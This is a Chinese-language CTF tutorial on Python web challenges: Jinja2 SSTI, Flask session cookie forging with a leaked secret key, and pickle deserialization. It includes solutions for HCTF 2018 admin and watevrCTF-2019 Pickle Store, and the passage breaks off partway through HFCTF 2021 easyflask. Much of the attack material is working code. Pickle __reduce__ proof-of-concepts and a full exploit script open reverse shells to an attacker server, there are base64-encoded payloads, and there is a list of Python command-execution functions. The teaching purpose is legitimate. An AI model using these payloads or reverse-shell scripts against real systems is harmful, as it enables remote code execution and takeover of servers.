> 原文链接: https://www.anquanke.com//post/id/247640 


# 浅谈 CTF-Web 中常见的 Python 题型与解题姿势


                                阅读量   
                                **21506**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t0139418f7cb00bef5a.png)](https://p2.ssl.qhimg.com/t0139418f7cb00bef5a.png)



## 前言

打 CTF 已经有一段时间了，今天在就此总结一下 CTF-Web 中常见的 Python 题型与解题姿势。



## Flask Jinja2 SSTI

这一块没什么好说的了，网上关于 SSTI 的文章已经烂大街了，各种题型也已经被师傅们琢磨透了，在此我只是简单的提一下。SSTI 就是服务器端模板注入(Server-Side Template Injection)，也给出了一个注入的概念，通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者 Getshell 的目的，目前CTF常见的SSTI题中，大部分是考 Python 和 PHP 的。其中 Python 的 SSTI 考 Flask Jinja2 的居多。

Jinja2 是默认的仿 Django 模板的一个模板引擎，由 Flask 的作者开发。网上搜的基本语法：
- **模板**
```
`{``{` ... `}``}`：变量包裹标识符，装载一个变量，模板渲染的时候，会使用传进来的同名参数将这个变量代表的值替换掉。
`{`% ... %`}`：装载一个控制语句，if、for等语句。
`{`# ... #`}`：装载一个注释，模板渲染的时候会忽视这中间的值
```
- **变量**
在模板中添加变量，可以使用 set 语句。

```
`{`% set name='xx' %`}`
```

`with`语句来**创建一个内部的作用域**，将set语句放在其中，这样创建的变量只在with代码块中才有效

```
`{`% with gg = 42 %`}`
`{``{` gg `}``}`
`{`% endwith %`}`
```
- **if语句**
```
`{`% if ken.sick %`}`
Ken is sick.
`{`% elif ken.dead %`}`
You killed Ken! You bastard!!!
`{`% else %`}`
Kenny looks okay --- so far
`{`% endif %`}`
```
- **for语句**
```
`{`% for user in users %`}`
`{``{` user.username|e `}``}`
`{`% endfor %`}`
```
- **遍历**
```
`{`% for key, value in &lt;strong&gt;my_dict.iteritems()&lt;/strong&gt; %`}`
`{``{` key|e `}``}`
`{``{` value|e `}``}`
`{`% endfor %`}`
```

我们知道，SQL 注入是从用户获得一个输入，然后由后端脚本语言进行数据库查询，当没有做好相应的过滤时便可以可以利用输入来拼接我们想要的 SQL 语句造成SQL 注入。SSTI 也是获取了一个输入，在后端的渲染处理上进行了语句的拼接，然后语句得到执行并又模板引擎渲染输出结果。

来看一个简单的例子：

```
from flask import Flask
    from flask import render_template
    from flask import request
    from flask import render_template_string
    app = Flask(__name__)
    @app.route('/test',methods=['GET', 'POST'])
    def test():
        template = '''
            &lt;div class="center-content error"&gt;
                &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt;
                &lt;h3&gt;%s&lt;/h3&gt;
            &lt;/div&gt; 
        ''' %(request.url)
return render_template_string(template)
    if __name__ == '__main__':
        app.debug = True
        app.run()
```

这就是一个十分典型的 SSTI 漏洞示例，上面这段代码中的template本可以写成如下这种格式：

```
&lt;div class="center-content error"&gt;
    &lt;h1&gt;Oops! That page doesn't exist.&lt;/h1&gt;
    &lt;h3&gt;`{``{`url`}``}`&lt;/h3&gt;
&lt;/div&gt;
```

但是一些偷懒的程序员却偏偏使用了 `%s`。而出现 SSTI 漏洞的原因也正是 `render_template_string()` 函数在渲染模板的时候使用了 `%s` 来动态的替换字符串，造成了数据和代码的混淆。代码中的 request.url 是用户可控的，会和 html 拼接后直接带入渲染。但是如果使用的是 ``{``{``}``}`` 则不会出现该漏洞，因为，``{``{``}``}`` 在 Jinja2 中作为变量包裹标识符，Jinja2 在渲染的时候会把 ``{``{``}``}`` 包裹的内容当做变量解析替换。

那我们该如何利用 SSTI 呢？由于在 Python 中，一切皆为对象，我们的主要的攻击思路便是回溯任何一个对象的父类，回溯父类的父类，最后一直到最顶层基类（`&lt;class'object'&gt;`）中去，再获得到此基类所有实现的子类，就可以获得到很多的类和方法了。而我们一般也就是从很多子类中找出可以利用的文件读写类和可以执行命令的类并加以利用。

具体的利用方式和 Bypass 姿势在我的另一篇文章中写的已经十分清晰了：[《以 Bypass 为中心谭谈 Flask-jinja2 SSTI 的利用》](https://xz.aliyun.com/t/9584)



## Flask Session 安全

### <a class="reference-link" name="%E5%AE%A2%E6%88%B7%E7%AB%AF%20Session"></a>客户端 Session

一般情况下，在 PHP 开发中，`$_SESSION` 变量的内容默认会被保存在服务端的一个文件中，并使用一个叫 `PHPSESSID` 的 Cookie 的值来区分不同用户的 session。由于这类 Session 的内容存储在服务端，所以这类 Session 是 “服务端 Session”，而用户在 Cookie 中看到的只是 Session 的名称（一个随机字符串）。

然而，并不是所有语言都有默认的 Session 存储机制，也不是任何情况下我们都可以向服务器写入文件。比如对于 Flask 框架，就将 Session 存储在了客户端的 Cookie 中。如下图所示便是一个 Flask Session：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01f9b5b91754de237f.png)

可以看到这里有一个客户端 Cookie，其默认的键为 `session`，值为经过加密的 Flask Session 内容。

因为 Cookie 实际上是存储在客户端（浏览器）中的，所以这类 Session 被称为 “客户端 Session”。而将 Session 存储在客户端 Cookie 中，最重要的就是解决 Session 不能被篡改的问题。

Flask 对 Session 的处理机制的主要过程如下：
1. json.dumps 将对象转换成 json 字符串，作为数据
1. 如果数据压缩后长度更短，则用zlib库进行压缩
1. 将数据进行 Base64 编码
1. 通过 hmac 算法计算数据的签名，将签名附在数据后，并用 `.` 分割
最后经过 Flask 处理的 Session 字符串的格式为：

```
json-&gt;zlib-&gt;base64后的源字符串 . 时间戳 . hmac签名信息
# 例如: eyJ1c2VybmFtZSI6eyIgYiI6ImQzZDNMV1JoZEdFPSJ9fQ.XzTQmw.3MN2SDWfDYfp6d3JwFziNcK2NwQ
```

### <a class="reference-link" name="Flask%20Session%20%E4%BC%AA%E9%80%A0"></a>Flask Session 伪造

Flask 是把 Session 存在客户端的，而且只经过 Base64 编码和用密钥签名。在进行 Session 的签名时需要用到一个预先设置的全局变量 `secret_key` ，而如果此时泄露了 `secret_key` ，攻击者就可以利用泄露的 `secret_key` 伪造签名，从而伪造出攻击者想要的 Flask Session。

通常情况下获取 `secret_key` 的方法有以下几种：
- 网站某处泄露获取
<li>通过 SSTI 漏洞获取，如 `/`{``{`config`}``}``
</li>
- 通过 SSRF 读取存在 `secret_key` 的 Flask 配置文件或读取 /proc/self/environ 获取
- 爆破
下面我们通过一道题来讲解 Flask Session 伪造的具体利用。

**<a class="reference-link" name="%5BHCTF%202018%5Dadmin"></a>[HCTF 2018]admin**

进入题目：

[![](https://p4.ssl.qhimg.com/t01536f72e99e8c7954.png)](https://p4.ssl.qhimg.com/t01536f72e99e8c7954.png)

查看源码发现：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015a368558139bb3fe.png)

暗示我们要用 admin 用户登录才能获得 flag，应该是与 Cookie 有关。我们先注册一个普通用户，登录进去后查看 Cookie：

[![](https://p0.ssl.qhimg.com/t01dd1b78e6a59e4c77.png)](https://p0.ssl.qhimg.com/t01dd1b78e6a59e4c77.png)

发现 Flask Session：

```
.eJw9kMGKwjAURX9leGsXNWM3gguHVKnwXrCkhmQjaqtp2ihUJU7Ef58ig-tzOZd7n7A99vXVwvTW3-sRbJsKpk_42sMUxHJldbStUXki-KYjl0fi84nxC4-u8kLpoGPVEl91mpWJUWtGsmiQL6yWZTJwRp4suYH7IevalHgWjcwZRf0gXjUks1TH9YPipkNVOK3KSO5ncJsGPQbklSefBSN1Sh4jSgzEdRD8MCGWBVwWjeA4g9cIDtf-uL1d2vr8mUDOOmLUolp1QuIv8ZJpubHo5qmQ5TfJNkWFkd61J4bOdGY9e-savzvVH9Ne5aH4J-edHwAEe9n5BkZwv9b9-zgYJ_D6A6rfbpQ.YIf05Q.JSosWcpGNzrOtCqWZPupfztjIwg
```

我们直接使用以下脚本对其进行解密：

```
# decode.py
#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))
```

执行：

```
python3 decode.py ".eJw9kMGKwjAURX9leGsXNWM3gguHVKnwXrCkhmQjaqtp2ihUJU7Ef58ig-tzOZd7n7A99vXVwvTW3-sRbJsKpk_42sMUxHJldbStUXki-KYjl0fi84nxC4-u8kLpoGPVEl91mpWJUWtGsmiQL6yWZTJwRp4suYH7IevalHgWjcwZRf0gXjUks1TH9YPipkNVOK3KSO5ncJsGPQbklSefBSN1Sh4jSgzEdRD8MCGWBVwWjeA4g9cIDtf-uL1d2vr8mUDOOmLUolp1QuIv8ZJpubHo5qmQ5TfJNkWFkd61J4bOdGY9e-savzvVH9Ne5aH4J-edHwAEe9n5BkZwv9b9-zgYJ_D6A6rfbpQ.YIf05Q.JSosWcpGNzrOtCqWZPupfztjIwg"
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017012042dfd142eb6.png)

如上图可以看到，解密出来的 Session 中有一个键是 `name`，用来表示当前用户，那我们接下来的思路就是找到 `secret_key` 来伪造 Flask Session 了，即将 `name` 改为 admin。

在修改密码处查看源码，发现源码泄露了：

[![](https://p1.ssl.qhimg.com/t01411b6e2f1b10a44b.png)](https://p1.ssl.qhimg.com/t01411b6e2f1b10a44b.png)

我们在源码的 config.py 中找到了 `secret_key` 为 “ckj123”：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t019135391a501be2d0.png)

有了 `secret_key` 之后，我们便可以开始伪造 Session 了。这里我们用到了github上的一个脚本 [flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)：

```
python3 flask_session_cookie_manager3.py encode -s "ckj123" -t "`{`'_fresh': True, '_id': b'8bac8deb485e623408faf27f9f0c7d42ece4ed654b01aa549f66ca62ebf0b99413e2676147b519c4175e1dcae360f9fb2c007f6a0e696c31304608787a00db83', 'csrf_token': b'68c7cd1be932456a5a2099575991c35e368626ee', 'image': b'mb0E', 'name': 'admin', 'user_id': '10'`}`"
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014527b9a45253c77e.png)

使用伪造得到的 Session 替换原来的 Session，刷新后即可得到flag：

[![](https://p1.ssl.qhimg.com/t01cff993f413481dfa.png)](https://p1.ssl.qhimg.com/t01cff993f413481dfa.png)

### <a class="reference-link" name="Flask%20Session%20%E5%AF%BC%E8%87%B4%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"></a>Flask Session 导致敏感信息泄露

经过前文的描述，你应该大致了解了 Flask Session 这个东西，你可以看到它里面存储了一些与用户认证有关的某些信息。有时候即便我们不能得到 `secret_key` 伪造 Flask Session，但我们也可以直接对 Flask Session 解密得到很多敏感信息。



## Python 反序列化漏洞

Python 中的pickle或cPickle库可以实现数据的序列化和反序列化操作（二者操作是一样的，只是cPickle提供了一个更快速简单的接口，这里以pickle为例），作用和PHP的serialize与unserialize类似，只不过一个是纯Python实现、另一个是C实现，函数调用基本相同，但cPickle库的性能更好，因此这里选用cPickle库作为示例。

pickle或cPickle库可以对任意一种类型的Python对象进行序列化操作。下面是主要的四个方法函数，我们按照他们实现的功能进行讲解。

### <a class="reference-link" name="%E5%BA%8F%E5%88%97%E5%8C%96"></a>序列化
- **dumps() 函数**
```
dumps(obj, protocol=None, *, fix_imports=True)
```

将指定的Python对象(比如列表、字典、元组、字符串、布尔值，甚至是一个类的对象等)通过pickle序列化作为bytes对象返回，而不是将其写入文件。如下实例。

Python 2.x环境下

```
import pickle
test = `{`'a':'str', 'c': True, 'e': 10, 'b': 11.1, 'd': None, 'f': [1, 2, 3], 'g':(4, 5, 6)`}`
result = pickle.dumps(test)
print result

"""
输出:
(dp0
S'a'
p1
S'str'
p2
sS'c'
p3
I01
sS'b'
p4
F11.1
sS'e'
p5
I10
sS'd'
p6
NsS'g'
p7
(I4
I5
I6
tp8
sS'f'
p9
(lp10
I1
aI2
aI3
as.

```

Python 3.x环境下

```
import pickle
test = `{`'a':'str', 'c': True, 'e': 10, 'b': 11.1, 'd': None, 'f': [1, 2, 3], 'g':(4, 5, 6)`}`
result = pickle.dumps(test)
print(result)

# 输出: b'\x80\x04\x95F\x00\x00\x00\x00\x00\x00\x00`}`\x94(\x8c\x01a\x94\x8c\x03str\x94\x8c\x01c\x94\x88\x8c\x01e\x94K\n\x8c\x01b\x94G@&amp;333333\x8c\x01d\x94N\x8c\x01f\x94]\x94(K\x01K\x02K\x03e\x8c\x01g\x94K\x04K\x05K\x06\x87\x94u.'
```

可见，在默认情况下Python 2.x中pickled后的数据是 **字符串** 的形式，Python 3.x中pickled后的数据是 **字节对象** 的形式。
- **dump()函数**
```
dump(obj, file, protocol=None, *, fix_imports=True)
```

将指定的Python对象通过pickle序列化后写入打开的文件对象中，等价于Pickler(file, protocol).dump(obj)。

### <a class="reference-link" name="%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"></a>反序列化
- loads()函数
```
loads(bytes_object, *, fix_imports=True, encoding="ASCII", errors="strict")
```

将通过pickle序列化后得到的字节对象进行反序列化，转换为Python对象并返回。如下示例。

Python 2.x环境下

```
import pickle
test = `{`'a':'str', 'c': True, 'e': 10, 'b': 11.1, 'd': None, 'f': [1, 2, 3], 'g':(4, 5, 6)`}`
result = pickle.loads(pickle.dumps(test))
print result

# 输出: `{`'a': 'str', 'c': True, 'b': 11.1, 'e': 10, 'd': None, 'g': (4, 5, 6), 'f': [1, 2, 3]`}`
```

Python 3.x环境下

```
import pickle
test = `{`'a':'str', 'c': True, 'e': 10, 'b': 11.1, 'd': None, 'f': [1, 2, 3], 'g':(4, 5, 6)`}`
result = pickle.loads(pickle.dumps(test))
print(result)

# 输出: `{`'a': 'str', 'c': True, 'e': 10, 'b': 11.1, 'd': None, 'f': [1, 2, 3], 'g': (4, 5, 6)`}`
```
- load()函数
```
load(file, *, fix_imports=True, encoding="ASCII", errors="strict")
```

从打开的文件对象中读取pickled对象表现形式并返回通过pickle反序列化后得到的Python对象。

> 注意：默认情况下Python 2.x中pickled后的数据是 **字符串形式**，需要将它转换为字节对象才能被Python 3.x中的pickle.loads()反序列化；Python 3.x中pickling所使用的协议是v3，因此需要在调用pickle.dumps()时指定可选参数protocol为Python 2.x所支持的协议版本（0,1,2），否则pickled后的数据不能被被Python 2.x中的pickle.loads()反序列化；Python 3.x中
pickle.dump()和pickle.load()方法中指定的文件对象，必须以 **二进制模式** 打开，而Python 2.x中可以以二进制模式打开，也可以以文本的模式打开。

### <a class="reference-link" name="%E8%87%AA%E5%AE%9A%E4%B9%89%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"></a>自定义数据类型的序列化/反序列化

首先来自定义一个数据类型：

```
class Student(object):
    def __init__(self, name, age, sno):
        self.name = name
        self.age = age
        self.sno = sno

    def __repr__(self):
        return 'Student [name: %s, age: %d, sno: %d]' % (self.name, self.age, self.sno)
```

pickle模块可以直接对自定数据类型进行序列化/反序列化操作，无需编写额外的处理函数或类，与PHP的serialize/unserialize函数一样：

```
&gt;&gt;&gt; stu = Student('Tom', 19, 1)
&gt;&gt;&gt; print(stu)
Student [name: Tom, age: 19, sno: 1]

# 序列化
&gt;&gt;&gt; var_b = pickle.dumps(stu)
&gt;&gt;&gt; var_b
b'\x80\x03c__main__\nStudent\nq\x00)\x81q\x01`}`q\x02(X\x04\x00\x00\x00nameq\x03X\x03\x00\x00\x00Tomq\x04X\x03\x00\x00\x00ageq\x05K\x13X\x03\x00\x00\x00snoq\x06K\x01ub.'

# 反序列化
&gt;&gt;&gt; var_c = pickle.loads(var_b)
&gt;&gt;&gt; var_c
Student [name: Tom, age: 19, sno: 1]

# 持久化到文件
&gt;&gt;&gt; with open('pickle.txt', 'wb') as f:
        pickle.dump(stu, f)
...

# 从文件总读取数据
&gt;&gt;&gt; with open('pickle.txt', 'rb') as f:
        pickle.load(f)
...
Student [name: Tom, age: 19, sno: 1]
```

### <a class="reference-link" name="%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"></a>反序列化漏洞

python反序列化漏洞的本质在于序列化对象的时候，类中自动执行的函数（如 `__reduce__`）也被序列化，而且在反序列化时候该函数会直接被执行。

漏洞产生的原因在于pickle可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发`__reduce__`方法从而触发恶意代码，类似与PHP中的`__wakeup__`，在反序列化的时候会自动调用。

**简单说明一下 `__reduce__` 方法：**

当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。`__reduce__()` 是一个二元操作函数，第一个参数是函数名，第二个参数是第一个函数的参数数据结构。`__reduce__` 方法被定义后，当对象被反序列化时就会被自动调用。它要么返回一个代表全局名称的字符串，要么返回一个元组，这个元组包含2到5个元素，主要用到前两个参数，即一个可调用的对象，用于重建对象时被调用，一个参数元素（也是元组形式），供那个可调用对象使用。

举个例子就清楚了：

```
import pickle
import os
class Exp(object):
    def __reduce__(self):
        # 导入os模块执行命令
        return(os.system,('ls',))
        # return(os.system,('ls',))
        # return(eval,("os.system('ls')",))
        # return(map,(os.system, ('ls',)))
        # return(eval,("__import__('os').system('ls')",))

a = Exp()
test = pickle.dumps(a)
pickle.loads(test)
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0116f9dbd56e85c42a.png)

如上图，可以看到成功执行了ls命令。

> **这里注意，在python2中只有内置类才有 `__reduce__` 方法，即用`class A(object)`声明的类，而python3中已经默认都是内置类了。**

当然我们还可以反弹shell：

```
import pickle
import os
class Exp(object):
    def __reduce__(self):
        shell = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xxx.xxx.xxx.xxx",2333));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"""
        return(os.system,(shell,))    
a=Exp()
result = pickle.dumps(a)
pickle.loads(result)
```

`pickle.loads()` 是会自动解决 import 问题的，对于未引入的 `module` 会自动尝试 `import`。那么也就是说整个python标准库的代码执行、命令执行函数我们都可以使用：

```
eval, execfile, compile, open, file, map, input,
os.system, os.popen, os.popen2, os.popen3, os.popen4, os.open, os.pipe,
os.listdir, os.access,
os.execl, os.execle, os.execlp, os.execlpe, os.execv,
os.execve, os.execvp, os.execvpe, os.spawnl, os.spawnle, os.spawnlp, os.spawnlpe,
os.spawnv, os.spawnve, os.spawnvp, os.spawnvpe,
pickle.load, pickle.loads,cPickle.load,cPickle.loads,
subprocess.call,subprocess.check_call,subprocess.check_output,subprocess.Popen,
commands.getstatusoutput,commands.getoutput,commands.getstatus,
glob.glob,
linecache.getline,
shutil.copyfileobj,shutil.copyfile,shutil.copy,shutil.copy2,shutil.move,shutil.make_archive,
dircache.listdir,dircache.opendir,
io.open,
popen2.popen2,popen2.popen3,popen2.popen4,
timeit.timeit,timeit.repeat,
sys.call_tracing,
code.interact,code.compile_command,codeop.compile_command,
pty.spawn,
posixfile.open,posixfile.fileopen,
platform.popen
```

**<a class="reference-link" name="%E5%AE%9E%E6%88%98%E6%BC%94%E7%A4%BA"></a>实战演示**

Web端源码：

```
import pickle
import base64
from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def index():
    try:
        user = base64.b64decode(request.cookies.get('user'))
        user = pickle.loads(user)
        username = user["username"]
    except:
        username = "Guest"

    return "Hello %s" % username

if __name__ == "__main__":
    app.run()
```

当访问 [http://your-ip:5000](http://your-ip:5000) 时，显示Hello `{`username`}`。username是取Cookie中的变量user，对其进行base64解码并进行反序列化后还原的对象中的“username”变量，默认为“Guest”。

此处便存在 Python 反序列化漏洞。因为user变量在cookie中，而cookie又是可控的，所以我们可以在cookie中给user变量写入payload，当后面对user进行反序列化时便会触发payload。

编写POC：

```
#!/usr/bin/env python3
import pickle
import os
import base64


class exp(object):
    def __reduce__(self):
        s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("你的VPS_ip地址",port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
        return os.system, (s,)


poc = exp()
s = pickle.dumps(poc)     # s为payload，将其传送到目标题目的cookie中
s = base64.b64encode(s).decode()
print(s)
```

得到payload：

```
gASVAQEAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjOZweXRob24gLWMgJ2ltcG9ydCBzb2NrZXQsc3VicHJvY2VzcyxvcztzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTtzLmNvbm5lY3QoKCI0Ny4xMDEuNTcuNzIiLDIzMzMpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7IG9zLmR1cDIocy5maWxlbm8oKSwxKTsgb3MuZHVwMihzLmZpbGVubygpLDIpO3A9c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9iYXNoIiwiLWkiXSk7J5SFlFKULg==
```

将cookie改为上面的payload即可触发 Python 反序列化并成功反弹Shell。

给出一个完整的利用脚本Exp：

```
#!/usr/bin/env python3
import requests
import pickle
import os
import base64


class exp(object):
    def __reduce__(self):
        s = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("你的VPS_ip地址",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'"""
        return os.system, (s,)


poc = exp()
s = pickle.dumps(poc)     # s为payload，将其传送到目标题目的cookie中

response = requests.get("http://your-ip:5000/", cookies=dict(
    user=base64.b64encode(s).decode()
))
print response.content
```

执行后Exp脚本后，成功反弹shell。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t013b7c1afd406ee9a3.png)

这就是一个典型的 Python 反序列化题目。[[watevrCTF-2019]Pickle Store](https://www.cnblogs.com/h3zh1/p/12698897.html) 这道题就是这样的一道题。

**<a class="reference-link" name="%5BwatevrCTF-2019%5DPickle%20Store"></a>[watevrCTF-2019]Pickle Store**

进入题目，是一个可以购买flag的页面：

[![](https://p2.ssl.qhimg.com/t01a58632fe7cc228df.png)](https://p2.ssl.qhimg.com/t01a58632fe7cc228df.png)

但是我们的钱不够，一般这种题就是让你在cookie处入手：

[![](https://p3.ssl.qhimg.com/t01ff9d858b4b15f0bf.png)](https://p3.ssl.qhimg.com/t01ff9d858b4b15f0bf.png)

将cookie进行base64解密，发现乱码：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01bb01223cd1e9606e.png)

虽然有乱码，但是发现还是挺像点什么的。再观察题目中的“Pickle”，联想到Python反序列化。这cookie可能就是先经过Pickle序列化然后再进行base64加密的数据。

我们编写如下脚本，将原始的cookie数据给反序列化出来：

```
import pickle
import base64

result = pickle.loads(base64.b64decode(b'gAN9cQAoWAUAAABtb25leXEBTfQBWAcAAABoaXN0b3J5cQJdcQNYEAAAAGFudGlfdGFtcGVyX2htYWNxBFggAAAAYWExYmE0ZGU1NTA0OGNmMjBlMGE3YTYzYjdmOGViNjJxBXUu'))
print(result)
```

得到：

```
`{`'money': 500, 'history': [], 'anti_tamper_hmac': 'aa1ba4de55048cf20e0a7a63b7f8eb62'`}`
```

看来确实是我们所猜测的。

那我们便可以将我们pickle反序列化的payload进行base64加密，然后放入到cookie中，当服务器再获取我们cookie并进行反序列化时，便会触发payload。

编写如下POC进行反弹shell：

```
import pickle
import base64
class A(object):
    def __reduce__(self):
        return (eval,("__import__('os').system('bash -c \"bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1\"')",))
poc = A()
result = pickle.dumps(poc)
result = base64.b64encode(result)
print(result)
```

得到payload：

```
gASVawAAAAAAAACMCGJ1aWx0aW5zlIwEZXZhbJSTlIxPX19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvNDcuMTAxLjU3LjcyLzIzMzMgMD4mMSInKZSFlFKULg==
```

将其设置为cookie的值，然后点击Buy：

[![](https://p2.ssl.qhimg.com/t01b2cb0eac9b3e3018.png)](https://p2.ssl.qhimg.com/t01b2cb0eac9b3e3018.png)

此时，攻击机上边收到了目标主机的shell并得到flag：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015ef1c0a45761b887.png)

**<a class="reference-link" name="%5BHFCTF%202021%20Final%5Deasyflask"></a>[HFCTF 2021 Final]easyflask**

进入题目，存在 SSRF，可以读取文件：

[![](https://p1.ssl.qhimg.com/t01078501a5e101827b.png)](https://p1.ssl.qhimg.com/t01078501a5e101827b.png)

存在 Flask Session，解密得到：

[![](https://p2.ssl.qhimg.com/t018e73281331283520.png)](https://p2.ssl.qhimg.com/t018e73281331283520.png)

访问 `/file?file=/app/source` 泄露得到源码：

```
#!/usr/bin/python3.6
import os
import pickle

from base64 import b64decode
from flask import Flask, request, render_template, session

app = Flask(__name__)
app.config["SECRET_KEY"] = "*******"

User = type('User', (object,), `{`
    'uname': 'test',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
`}`)


@app.route('/', methods=('GET',))
def index_handler():
    if not session.get('u'):
        u = pickle.dumps(User())
        session['u'] = u
    return "/file?file=index.js"


@app.route('/file', methods=('GET',))
def file_handler():
    path = request.args.get('file')
    path = os.path.join('static', path)
    if not os.path.exists(path) or os.path.isdir(path) \
            or '.py' in path or '.sh' in path or '..' in path or "flag" in path:
        return 'disallowed'

    with open(path, 'r') as fp:
        content = fp.read()
    return content


@app.route('/admin', methods=('GET',))
def admin_handler():
    try:
        u = session.get('u')    # 获取 Flask Session 中 u 这个键的值
        if isinstance(u, dict):
            u = b64decode(u.get('b'))    #获取 u 中 b 这个键的值
        u = pickle.loads(u)    # 对 b 这个键的值进行反序列化, 存在 pickle 反序列化漏洞
    except Exception:
        return 'uhh?'

    if u.is_admin == 1:
        return 'welcome, admin'
    else:
        return 'who are you?'


if __name__ == '__main__':
    app.run('0.0.0.0', port=80, debug=False)
```

代码的逻辑很明朗了，/admin 路由存在反序列化漏洞，可以获取 Flask Session 中的某个键的值进行 pickle 反序列化，由于这里被反序列化的值是可控的，所以存在 pickle 反序列化漏洞。但是要利用 pickle 反序列化漏洞我们还需要先获取 `secret_key` 来伪造 Session。

这里我们直接通过那个 SSRF 读取 /proc 目录里的环境变量，在环境变量里面找到了 `secret_key` ：

